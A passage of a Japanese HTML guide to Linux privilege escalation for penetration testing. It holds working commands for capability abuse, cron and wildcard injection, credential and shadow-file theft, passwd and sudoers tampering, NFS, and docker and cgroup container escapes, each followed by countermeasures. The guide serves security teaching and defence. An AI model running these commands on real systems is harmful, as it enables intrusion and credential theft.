+      <p>capability は SUID の粒度を細かくした仕組みだが、<strong>特定の cap は事実上 root と等価</strong>。SUID 列挙で何も出なくても capability で抜けることがあるため、必ず別途 <code>getcap -r /</code> を回す。</p>
+
+      <h3 id="getcap">列挙と致命的な cap</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>getcap -r / 2&gt;/dev/null
+<span class="c"># プロセスに付与された cap も確認</span>
+cat /proc/self/status | grep Cap
+capsh --decode=<span class="v">&lt;CAP_HEX&gt;</span>          <span class="c"># CapEff の hex を人間可読に</span></code></pre></div>
+      <table>
+        <thead><tr><th>capability</th><th>悪用</th><th>root 等価性</th></tr></thead>
+        <tbody>
+          <tr><td><code>cap_setuid</code></td><td>プロセスの uid を 0 に</td><td>実質 root</td></tr>
+          <tr><td><code>cap_dac_read_search</code></td><td>DAC 読取無視 → <code>/etc/shadow</code> 読取</td><td>hash 経由で root</td></tr>
+          <tr><td><code>cap_dac_override</code></td><td>DAC 書込無視 → <code>/etc/passwd</code> <code>/etc/shadow</code> 改竄</td><td>実質 root</td></tr>
+          <tr><td><code>cap_sys_admin</code></td><td>mount 等の広範な操作。多くのサブ機能を包含</td><td>実質 root</td></tr>
+          <tr><td><code>cap_sys_ptrace</code></td><td>任意プロセスに ptrace → root プロセスへ inject</td><td>実質 root</td></tr>
+          <tr><td><code>cap_sys_module</code></td><td>任意 kernel module ロード</td><td>実質 root</td></tr>
+          <tr><td><code>cap_chown</code> / <code>cap_fowner</code></td><td>所有者・パーミッション変更</td><td>間接 root</td></tr>
+        </tbody>
+      </table>
+
+      <h3 id="cap-abuse">悪用パターン</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># cap_setuid が python に付いている定番</span>
+<span class="c"># getcap → /usr/bin/python3.x = cap_setuid+ep</span>
+python3 -c <span class="s">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+
+<span class="c"># cap_setuid on perl</span>
+perl -e <span class="s">'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'</span>
+
+<span class="c"># cap_dac_read_search — GTFOBins に cap 別ページあり。tar/gdb 等で任意読取</span>
+<span class="c"># 例: cap_dac_read_search+ep な tar で shadow を吸い出す</span>
+./tar cvf /tmp/s.tar /etc/shadow &amp;&amp; tar xf /tmp/s.tar -O
+
+<span class="c"># cap_dac_override on vim → shadow/passwd を直接編集</span>
+./vim /etc/passwd
+
+<span class="c"># cap_sys_ptrace — root プロセスに shellcode inject (要同一/隣接権限の対象)</span>
+<span class="c"># gdb -p &lt;root_pid&gt; で call system("...") を叩く古典</span></code></pre></div>
+      <div class="note"><span class="lbl">note</span>GTFOBins は各 binary に「Capabilities」専用のセクションを持っている。<code>getcap</code> でヒットした binary 名を GTFOBins で引き、Sudo でも SUID でもなく <strong>Capabilities タブ</strong>を見ること。<code>+ep</code> が付いていれば大抵そのまま刺さる。</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>ファイル capability を棚卸し。<code>cap_setuid</code> <code>cap_dac_*</code> <code>cap_sys_admin</code> <code>cap_sys_ptrace</code> <code>cap_sys_module</code> をインタプリタや汎用ツールに付けない</li>
+          <li>どうしても必要な場合は専用の小さな wrapper binary に限定し、汎用 binary (python/perl/tar/gdb) には付与しない</li>
+          <li>AIDE で <code>getcap -r /</code> の出力を baseline 化し、新規付与を検知</li>
+        </ul>
+      </div>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>SUID がゼロでも <code>getcap -r /</code> は別途必ず回す</li>
+          <li>python/perl への <code>cap_setuid+ep</code> は一行で root。<code>cap_dac_*</code> は shadow 経由</li>
+          <li>GTFOBins は Sudo/SUID とは別に Capabilities タブがある</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s06" class="reveal">
+      <h2><span class="num">06</span>Scheduled Execution<span class="jp">cron / timer / PATH</span></h2>
+      <p>root が定期実行するものに割り込む。書込可能なスクリプト・PATH 汚染・wildcard injection の 3 系統。pspy (<a href="#s02">s02</a>) で「何が動いているか」を掴んでから狙う。</p>
+
+      <h3 id="cron-enum">cron 列挙</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
+cat /etc/cron.d/*
+crontab -l 2&gt;/dev/null                 <span class="c"># 自分の crontab</span>
+ls -la /var/spool/cron/crontabs/ 2&gt;/dev/null   <span class="c"># 通常 root しか読めない → pspy で補完</span>
+systemctl list-timers --all           <span class="c"># cron ではなく systemd timer のことも</span>
+
+<span class="c"># 走っているスクリプトのうち書込可能なものを直接探す</span>
+grep -rE <span class="s">'[0-9*]+ .*sh|/opt/|/home/'</span> /etc/cron* 2&gt;/dev/null
+find /etc/cron* -writable 2&gt;/dev/null</code></pre></div>
+
+      <h3 id="cron-writable">書込可能スクリプトの上書き</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># root cron が /opt/backup.sh を回していて、それが書込可能なら</span>
+ls -la /opt/backup.sh
+echo <span class="s">'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'</span> &gt;&gt; /opt/backup.sh
+<span class="c"># 次回実行を待つ → SUID bash が落ちる</span>
+/tmp/rootbash -p</code></pre></div>
+
+      <h3 id="cron-path">PATH 汚染</h3>
+      <p><code>/etc/crontab</code> の <code>PATH=</code> 行が <code>/home/user</code> など書込可能ディレクトリを含み、cron ジョブが<strong>絶対パスなしでコマンドを呼ぶ</strong>場合、そのコマンド名で偽物を置く。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>head /etc/crontab       <span class="c"># PATH= に書込可能な dir が先頭にないか</span>
+<span class="c"># 例: PATH=/home/user:/usr/bin ... で cron が "backup" を相対で呼ぶ</span>
+cat &gt; /home/user/backup &lt;&lt;'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
+EOF
+chmod +x /home/user/backup</code></pre></div>
+
+      <h3 id="wildcard">wildcard injection</h3>
+      <p>cron が <code>tar</code>/<code>rsync</code>/<code>chown</code>/<code>chmod</code> を <code>*</code> 付きで、かつ<strong>自分が書けるディレクトリ内で</strong>実行しているとき、ファイル名を option として解釈させる古典。pspy で <code>tar czf … *</code> のような行を見たら成立を疑う。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># root cron: cd /var/www &amp;&amp; tar czf /backup/www.tgz *</span>
+<span class="c"># --checkpoint-action で任意コマンド実行に化ける</span>
+cd /var/www
+echo <span class="s">'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'</span> &gt; shell.sh
+touch -- <span class="s">'--checkpoint=1'</span>
+touch -- <span class="s">'--checkpoint-action=exec=sh shell.sh'</span>
+<span class="c"># tar が * を展開すると上の2ファイルが option になり shell.sh が root 実行される</span>
+
+<span class="c"># rsync -e パターン / chown --reference パターンも同系統。GTFOBins 参照</span></code></pre></div>
+      <div class="note"><span class="lbl">note</span>wildcard injection の成立条件は「cron が書込可能ディレクトリ内で <code>*</code> を使う」こと。ファイル名で option を注入するので、<code>tar</code> なら <code>--checkpoint</code>、<code>chown</code>/<code>chmod</code> なら <code>--reference</code>、<code>rsync</code> なら <code>-e</code> が入口になる。</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>cron スクリプトとその親ディレクトリを root 所有・非書込に。<code>find</code> で world/group writable な cron 資産を定期監査</li>
+          <li>cron の <code>PATH</code> は絶対パスの安全なディレクトリのみ。ジョブ内のコマンドは絶対パスで呼ぶ</li>
+          <li>アーカイブ処理は <code>tar czf out.tgz -- ./*</code> のように <code>--</code> で option 終端を明示するか、<code>find … -print0 | tar --null -T -</code> で <code>*</code> 展開を避ける</li>
+          <li>auditd で cron が起動するプロセスツリーを監視。想定外の子プロセスを検知</li>
+        </ul>
+      </div>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>pspy で「root の定期実行」を掴んでから狙う。crontab が読めない前提で動く</li>
+          <li>書込可能スクリプト &gt; PATH 汚染 &gt; wildcard injection の順で当たりやすい</li>
+          <li>wildcard は <code>*</code> + 書込可能ディレクトリ + option を取る binary の三点セット</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s07" class="reveal">
+      <h2><span class="num">07</span>Service / polkit<span class="jp">サービス・polkit・IPC</span></h2>
+      <p>書込可能な systemd unit、ローカル待受サービス、そして polkit / D-Bus 経由の権限昇格。ここは「正規の特権デーモンを騙す」系統で、kernel exploit より安定して刺さることが多い。</p>
+
+      <h3 id="systemd-unit">書込可能 systemd unit</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 書込可能な unit / service ファイルを探す</span>
+find /etc/systemd/ /lib/systemd/ /run/systemd/ -writable -type f 2&gt;/dev/null
+systemctl list-units --type=service --state=running
+<span class="c"># unit が指す ExecStart のバイナリ/スクリプトが書込可能なパターンも多い</span>
+grep -r ExecStart /etc/systemd/system/ 2&gt;/dev/null</code></pre></div>
+      <div class="code"><div class="code-bar"><span class="code-lang">ini</span><button class="copy">copy</button></div><pre><code><span class="c"># 書込可能な .service を改竄し、restart 権限 or 再起動を待つ</span>
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c <span class="s">'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'</span>
+[Install]
+WantedBy=multi-user.target
+<span class="c"># systemctl daemon-reload &amp;&amp; systemctl start &lt;svc&gt; が撃てるか、reboot cron 待ち</span></code></pre></div>
+
+      <h3 id="pwnkit">PwnKit — CVE-2021-4034 (pkexec)</h3>
+      <p>polkit の <code>pkexec</code> は標準 SUID。CVE-2021-4034 は<strong>引数ゼロ実行時の環境変数処理の欠陥</strong>で、設定不要・ほぼ全 distro・極めて安定という三拍子が揃った歴史的 privesc。古い環境では最初に試す価値がある。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>pkexec --version                       <span class="c"># 0.105〜0.120 あたりは候補</span>
+<span class="c"># 判定: polkit のパッチ日を確認 (distro backport されているか)</span>
+dpkg -l | grep policykit ; rpm -q polkit 2&gt;/dev/null
+<span class="c"># 公開 exploit (C 単体で完結、依存なし): github.com/ly4k/PwnKit</span>
+<span class="c"># 実行は 1 バイナリ。in-memory 版もある</span></code></pre></div>
+
+      <h3 id="pam-udisks">PAM + udisks chain — CVE-2025-6018 / CVE-2025-6019</h3>
+      <p>2025 年 6 月に Qualys が公表した 2 段 chain。<code>allow_active</code> への昇格 (PAM 設定の穴、CVE-2025-6018) と、そこから root への昇格 (libblockdev/udisks が一時 mount 時に <code>nosuid</code> を付け忘れる、CVE-2025-6019) を繋ぐ。udisks は大半の distro でデフォルト稼働のため影響範囲が広い。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># udisks / libblockdev の存在とバージョン</span>
+which udisksctl; systemctl status udisks2 2&gt;/dev/null | head -3
+dpkg -l | grep -E <span class="s">'libblockdev|udisks'</span>
+
+<span class="c"># CVE-2025-6019 単体でも allow_active を既に持っていれば root まで届く</span>
+<span class="c"># (ローカルの物理/GUI セッション、または CVE-2025-6018 で allow_active を得た後)</span>
+<span class="c"># PoC: github.com/MichaelVenturella/CVE-2025-6018-6019-PoC</span></code></pre></div>
+
+      <h3 id="coredump">systemd-coredump 情報漏洩 — CVE-2025-4598</h3>
+      <p>直接 root ではないが、<strong>SUID プロセスの core dump から <code>/etc/shadow</code> の内容や SSH host key を吸い出す</strong> TOCTOU。RHEL 9/10・Fedora が対象。SUID プロセスをクラッシュさせ、同 PID を非 SUID プロセスで置換して coredump 読取権を得る。s08 の credential 経路と接続する。</p>
+
+      <h3 id="local-svc">ローカル待受サービス</h3>
+      <p>s01 で見つけた <code>127.0.0.1</code> bind のサービスは、root で動いていれば昇格経路。Redis (<code>CONFIG SET dir</code> で cron/authorized_keys 書込)、Jenkins/CI (script console)、内部 DB (UDF)、古い管理 API などが典型。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>ss -tulpn | grep 127.0.0.1
+ps -ef | grep -E <span class="s">'redis|mysql|jenkins|memcache'</span> | grep -v grep
+<span class="c"># root で動く Redis の例 — authorized_keys を書く</span>
+redis-cli -h 127.0.0.1
+&gt; config set dir /root/.ssh/
+&gt; config set dbfilename authorized_keys
+&gt; set x <span class="s">"\n\nssh-ed25519 AAAA... attacker\n\n"</span>
+&gt; save</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>unit ファイルと ExecStart 対象を root 所有・非書込に。<code>systemctl edit</code> の drop-in 権限も監査</li>
+          <li>polkit / udisks / libblockdev をパッチ最新へ。使わない udisks2 は無効化。PwnKit 対策として pkexec の SUID を落とす選択肢も</li>
+          <li>CVE-2025-4598 の緩和は <code>fs.suid_dumpable=0</code>。core dump をそもそも無効化 (<code>ulimit -c 0</code> / coredump.conf) するのが堅い</li>
+          <li>ローカルサービスに認証を必須化。Redis は <code>requirepass</code> + <code>protected-mode</code>、非 root ユーザで起動</li>
+          <li>auditd で unit ファイル書込・pkexec 実行・udisks の mount 呼び出しを監視</li>
+        </ul>
+      </div>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>特権デーモンを騙す系統は kernel exploit より安定。まずこちらを尽くす</li>
+          <li>PwnKit (CVE-2021-4034) は古い環境なら最優先。設定不要・ほぼ全 distro</li>
+          <li>2025 の udisks chain と coredump は distro デフォルト構成に刺さる。バージョン確認を習慣化</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s08" class="reveal">
+      <h2><span class="num">08</span>Credential Hunting<span class="jp">認証材料の探索</span></h2>
+      <p>昇格は exploit だけではない。<strong>どこかに落ちている root のパスワード・SSH 鍵・API トークン</strong>を拾うほうが速く静かなことが多い。取得した material の横展開は <a href="lateral-movement.html">lateral-movement</a> へ引き継ぐ。</p>
+
+      <h3 id="cred-files">ファイルベース</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># history 系 — 平文パスワードが sudo/mysql/ssh 引数に残りがち</span>
+cat ~/.bash_history ~/.zsh_history 2&gt;/dev/null
+find /home /root -name <span class="s">'*_history'</span> -readable 2&gt;/dev/null -exec cat {} +
+
+<span class="c"># SSH 鍵 (自分が読めるもの全部)</span>
+find / -name <span class="s">'id_rsa'</span> -o -name <span class="s">'id_ed25519'</span> -o -name <span class="s">'*.pem'</span> 2&gt;/dev/null
+find / -name <span class="s">'authorized_keys'</span> 2&gt;/dev/null    <span class="c"># どの鍵が通るかの手がかり</span>
+
+<span class="c"># 設定ファイルに埋まった資格情報</span>
+grep -rniE <span class="s">'password|passwd|secret|api[_-]?key|token|BEGIN.*PRIVATE'</span> \
+  /var/www /opt /home /etc 2&gt;/dev/null | grep -vE <span class="s">'Binary|\.min\.'</span> | head -60
+find / -name <span class="s">'.env'</span> -o -name <span class="s">'wp-config.php'</span> -o -name <span class="s">'settings.py'</span> \
+  -o -name <span class="s">'.my.cnf'</span> -o -name <span class="s">'.pgpass'</span> -o -name <span class="s">'credentials'</span> 2&gt;/dev/null
+
+<span class="c"># cloud metadata / IAM (クラウド上のホストなら)</span>
+cat ~/.aws/credentials ~/.config/gcloud/* 2&gt;/dev/null
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2&gt;/dev/null</code></pre></div>
+
+      <h3 id="shadow-crack">/etc/shadow が読めた場合</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># passwd と shadow を結合して john 形式へ</span>
+unshadow /etc/passwd /etc/shadow &gt; unshadowed.txt
+
+<span class="c"># hash 種別を確認 ($6=sha512crypt, $y=yescrypt, $2=bcrypt …)</span>
+head -1 /etc/shadow
+
+<span class="c"># hashcat: sha512crypt=1800, yescrypt=不可(john), bcrypt=3200, md5crypt=500</span>
+hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --rules=best64
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</code></pre></div>
+      <div class="note"><span class="lbl">note</span>yescrypt (<code>$y$</code>、Debian 11+/Ubuntu 22.04+ のデフォルト) は hashcat が未対応で john 側でのみ crack する。sha512crypt (<code>$6$</code>) は hashcat mode 1800。種別を先に確定してからツールを選ぶ。crack 詳細は <a href="ad-compromise.html">ad-compromise</a> の hash 節も参照。</div>
+
+      <h3 id="memory-cred">メモリ・プロセス経由</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 実行中プロセスの引数に平文 (ps は瞬間、常時監視は pspy)</span>
+ps auxww | grep -iE <span class="s">'pass|pwd|token|-p '</span> | grep -v grep
+
+<span class="c"># 環境変数に埋まった秘密 (自分が読めるプロセスのみ)</span>
+for p in /proc/[0-9]*/environ; do tr '\0' '\n' &lt; $p 2&gt;/dev/null | grep -iE <span class="s">'PASS|TOKEN|KEY|SECRET'</span>; done
+
+<span class="c"># GNOME keyring / SSH agent socket の乗っ取り (同ユーザ別 session)</span>
+ls -la /tmp/ssh-*/agent.* 2&gt;/dev/null
+SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNN ssh-add -l    <span class="c"># 生きている鍵があれば lateral</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>秘密情報をファイル・環境変数・コマンド引数に置かない。secret manager / systemd credentials を使う</li>
+          <li><code>HISTFILE</code> を機微操作で無効化、あるいは監査ログ側に一本化。world-readable な history を作らない</li>
+          <li>SSH 秘密鍵は passphrase 必須 + mode 600。<code>.env</code> / <code>wp-config.php</code> 等は最小パーミッションに</li>
+          <li>クラウドは IMDSv2 強制 + IAM 最小権限。169.254.169.254 への到達をアプリ層で制限</li>
+        </ul>
+      </div>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>exploit より先に「落ちている資格情報」を探すほうが速く静か</li>
+          <li>shadow の hash は種別を先に確定。yescrypt は john、sha512crypt は hashcat 1800</li>
+          <li>ssh-agent socket と <code>/proc/*/environ</code> は同ユーザ横取りの盲点</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s09" class="reveal">
+      <h2><span class="num">09</span>Filesystem / Mount<span class="jp">ファイルシステム・マウント</span></h2>
+      <p>書込可能な認証ファイル、NFS の <code>no_root_squash</code>、fstab の穴。パーミッションのミスだけで root になれる、最も「設定ミス」寄りの経路。</p>
+
+      <h3 id="writable-auth">書込可能な認証ファイル</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/ /etc/group
+find /etc -writable -type f 2&gt;/dev/null
+
+<span class="c"># /etc/passwd が書けるなら root ユーザを追記 (x なし = パスワード無しの古典 or hash 埋め込み)</span>
+openssl passwd -1 -salt hacked pass123           <span class="c"># $1$ md5crypt を生成</span>
+echo <span class="s">'hacked:$1$hacked$XXXXXXXX:0:0:root:/root:/bin/bash'</span> &gt;&gt; /etc/passwd
+su hacked                                          <span class="c"># pass123</span>
+
+<span class="c"># /etc/sudoers.d/ に書けるなら NOPASSWD ルールを足す</span>
+echo <span class="s">"$(whoami) ALL=(ALL) NOPASSWD: ALL"</span> &gt; /etc/sudoers.d/pwn
+
+<span class="c"># /etc/shadow が書けるなら既知 hash で root の行を置換</span></code></pre></div>
+      <div class="note"><span class="lbl">note</span>現代の Linux は <code>/etc/passwd</code> の第二フィールドが <code>x</code> で shadow を参照する。ここに直接 hash を書けば shadow を触らずに済む。<code>x</code> を空にして「パスワード無し root」を作る古典技は、<code>PermitEmptyPasswords</code> 等の制約で通らないことがあるため hash 埋め込みのほうが確実。</div>
+
+      <h3 id="nfs">NFS no_root_squash</h3>
+      <p>export 側に <code>no_root_squash</code> が付いていると、<strong>client 側の root が server 上でも root として書ける</strong>。攻撃者が root な別マシン(自分の Kali 等)からその share を mount し、SUID binary を置けば target 側で root shell になる。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># target 側で export 設定を確認</span>
+cat /etc/exports 2&gt;/dev/null
+showmount -e <span class="v">&lt;TARGET&gt;</span>          <span class="c"># attacker 側から</span>
+
+<span class="c"># no_root_squash な share を attacker(root) で mount</span>
+mkdir /mnt/nfs; mount -o rw,vers=3 <span class="v">&lt;TARGET&gt;</span>:/share /mnt/nfs
+
+<span class="c"># SUID root shell を置く (attacker が root なので所有者 root で書ける)</span>
+cp /bin/bash /mnt/nfs/rootbash
+chmod +s /mnt/nfs/rootbash
+
+<span class="c"># target 側の非特権 shell から (share が target からも見える前提)</span>
+/share/rootbash -p</code></pre></div>
+
+      <h3 id="mount-misc">その他 mount 起因</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>cat /etc/fstab                         <span class="c"># 平文パスワード・credential ファイル指定・nosuid 欠落</span>
+mount | grep -vE <span class="s">'nosuid|noexec'</span>    <span class="c"># SUID 有効な mount を洗う</span>
+lsblk; blkid                           <span class="c"># 未 mount のパーティション (別ユーザの / を含むことも)</span>
+
+<span class="c"># disk グループなら raw device を直接読む</span>
+debugfs /dev/sda1                       <span class="c"># -w で書込。/etc/shadow を cat 可能</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><code>/etc/passwd</code> <code>/etc/shadow</code> <code>/etc/sudoers*</code> <code>/etc/group</code> のパーミッションを AIDE で baseline 化し、書込可能化を検知</li>
+          <li>NFS export は <code>root_squash</code> (既定) を維持。<code>no_root_squash</code> は原則使わない。必要なら <code>sec=krb5</code> + IP 制限</li>
+          <li>ユーザ書込可能な mount は <code>nosuid,nodev</code>。fstab に平文 credential を書かず <code>credentials=</code> ファイル (mode 600) を使う</li>
+          <li><code>disk</code> グループへの所属を厳しく管理。raw device 読取は shadow 相当</li>
+        </ul>
+      </div>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>認証ファイルの書込可否は 1 行で確認でき、通れば最速。<code>sudoers.d</code> 追記が最も静か</li>
+          <li>NFS <code>no_root_squash</code> は attacker が root な別ホストを持っていれば SUID 設置で勝ち</li>
+          <li><code>disk</code> グループ = shadow 読取。mount option の <code>nosuid</code> 欠落も見る</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s10" class="reveal">
+      <h2><span class="num">10</span>Container Escape<span class="jp">コンテナ脱出</span></h2>
+      <p>コンテナ内 root、あるいは host 上の <code>docker</code>/<code>lxd</code> グループ所属からの脱出。s01 のグループ確認で見当がついていれば、ここは最短経路の一つ。</p>
+
+      <h3 id="am-i-container">コンテナ判定</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>cat /proc/1/cgroup; ls -la /.dockerenv 2&gt;/dev/null
+cat /proc/self/status | grep -i cap    <span class="c"># CapEff が広い = privileged 疑い</span>
+capsh --print
+mount | grep -E <span class="s">'docker|overlay'</span>
+env | grep -i <span class="s">'KUBERNETES\|DOCKER'</span></code></pre></div>
+
+      <h3 id="docker-sock">docker.sock / docker グループ</h3>
+      <p>docker socket に触れる = host root 等価。<code>docker</code> グループ所属、またはコンテナ内に socket が mount されている場合に成立。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>ls -la /var/run/docker.sock 2&gt;/dev/null
+id | grep -o docker
+
+<span class="c"># host の / をコンテナに mount して chroot → host root</span>
+docker run -v /:/host --rm -it alpine chroot /host /bin/bash
+
+<span class="c"># socket に直接触れる場合 (docker cli なし・API 直叩き)</span>
+<span class="c"># /var/run/docker.sock 経由で privileged コンテナを作り host fs を mount</span>
+
+<span class="c"># コンテナ内から socket が見える場合も同じ</span>
+docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh</code></pre></div>
+
+      <h3 id="privileged">privileged コンテナ / cap_sys_admin</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># --privileged または cap_sys_admin があれば host device を mount できる</span>
+fdisk -l                               <span class="c"># host のディスクが見える</span>
+mkdir /hostfs; mount /dev/sda1 /hostfs <span class="c"># host / を直接 mount</span>
+chroot /hostfs bash
+
+<span class="c"># 古典の cgroup release_agent 脱出 (privileged 前提)</span>
+<span class="c"># notify_on_release + release_agent に host 側実行させる shell を仕込む</span>
+mkdir /tmp/cg; mount -t cgroup -o rdma cgroup /tmp/cg; mkdir /tmp/cg/x
+echo 1 &gt; /tmp/cg/x/notify_on_release
+host_path=$(sed -n <span class="s">'s/.*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab)   <span class="c"># overlay の upperdir=host パス</span>
+echo <span class="s">"$host_path/cmd"</span> &gt; /tmp/cg/release_agent
+printf <span class="s">'#!/bin/sh\ncp /bin/bash %s/bash; chmod +s %s/bash'</span> $host_path $host_path &gt; /cmd
+chmod +x /cmd
+sh -c <span class="s">"echo \$\$ &gt; /tmp/cg/x/cgroup.procs"</span>   <span class="c"># 空 cgroup へ→終了時に release_agent が host 側で発火</span></code></pre></div>
+
+      <h3 id="lxd">lxd / lxc グループ</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># lxd グループ = host root。privileged container に host / を mount</span>
+id | grep -o lxd
+<span class="c"># alpine image を取り込み、security.privileged=true で host / を disk mount</span>
+lxc image import ./alpine.tar.gz --alias pwn 2&gt;/dev/null || lxd init --auto
+lxc init pwn c1 -c security.privileged=true
+lxc config device add c1 host disk source=/ path=/mnt/root recursive=true
+lxc start c1
+lxc exec c1 /bin/sh
+<span class="c"># container 内: /mnt/root が host の / 。chroot して SUID を仕込む</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><code>docker</code>/<code>lxd</code> グループ所属 = root 委譲。付与を厳格化し、rootless docker / podman を検討</li>
+          <li>docker socket をコンテナに mount しない。必要なら socket proxy で API を最小化</li>
+          <li><code>--privileged</code> を使わない。cap は必要最小 (<code>--cap-drop=ALL</code> + 個別追加)、<code>--security-opt=no-new-privileges</code></li>
+          <li>seccomp / AppArmor プロファイルを有効化。user namespace remap で container root ≠ host root に</li>
+          <li>Falco 等で container からの mount / chroot / release_agent 書込を検知</li>
+        </ul>
+      </div>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li><code>docker</code>/<code>lxd</code> グループと docker.sock は host root 等価。s01 の <code>id</code> で即判定</li>
+          <li>privileged / cap_sys_admin コンテナは host device を直接 mount できる</li>
+          <li>release_agent 脱出は古いが privileged 環境で依然有効</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s11" class="reveal">
+      <h2><span class="num">11</span>Kernel / Userland Exploit<span class="jp">カーネル・ユーザランド exploit</span></h2>
+      <p><strong>最後の手段</strong>。kernel exploit は不安定で、失敗すれば panic やサービス断を起こす。engagement では設定不備・認証情報・特権デーモン(s03-s10)を尽くしてから、それでも駄目な場合にだけ触れる。CTF では逆に第一選択になることもある。</p>
+
+      <h3 id="version-map">バージョン特定と候補選定</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>uname -r; cat /proc/version
+cat /etc/os-release                    <span class="c"># distro を必ず併せて見る (backport 判断に必須)</span>
+
+<span class="c"># suggester は候補出しのみ。鵜呑みにしない</span>
+./linux-exploit-suggester-2.pl
+./linux-exploit-suggester.sh --kernel $(uname -r)</code></pre></div>
+      <div class="note warn"><span class="lbl">warn</span>suggester が「vulnerable」と出しても、distro が該当 CVE を backport 修正済みならバージョン番号が古く見えても実際には塞がっている。逆も然り。<code>uname -r</code> だけで判断せず、distro のセキュリティ告知 (Ubuntu USN / Debian DSA / RHEL errata) でパッチ適用状況を確認する。これを飛ばすと動かない exploit をビルドして時間を浪費する。</div>
+
+      <h3 id="notable-cve">主要 CVE (kernel / userland)</h3>
+      <table>
+        <thead><tr><th>CVE / 通称</th><th>層</th><th>対象</th><th>備考</th></tr></thead>
+        <tbody>
+          <tr><td><strong>CVE-2026-23111</strong></td><td>kernel (nf_tables)</td><td>Debian Bookworm/Trixie, Ubuntu 22.04/24.04 (2026-02 以前)</td><td>UAF。<code>CONFIG_USER_NS</code> + <code>CONFIG_NF_TABLES</code> で unpriv から。idle で 99% 超の信頼性と報告</td></tr>
+          <tr><td>CVE-2021-4034 (PwnKit)</td><td>userland (polkit)</td><td>ほぼ全 distro (2021 以前)</td><td>設定不要・極めて安定。古環境の第一候補 — <a href="#s07">s07</a></td></tr>
+          <tr><td>CVE-2022-0847 (Dirty Pipe)</td><td>kernel (pipe)</td><td>5.8 – 5.16.11 / 5.15.25 / 5.10.102</td><td>read-only / SUID ファイルを上書き。安定・非破壊的で使いやすい</td></tr>
+          <tr><td>CVE-2021-3493</td><td>kernel (OverlayFS)</td><td>Ubuntu 固有 (unpriv userns)</td><td>Ubuntu の overlayfs 実装差分を突く。刺されば安定</td></tr>
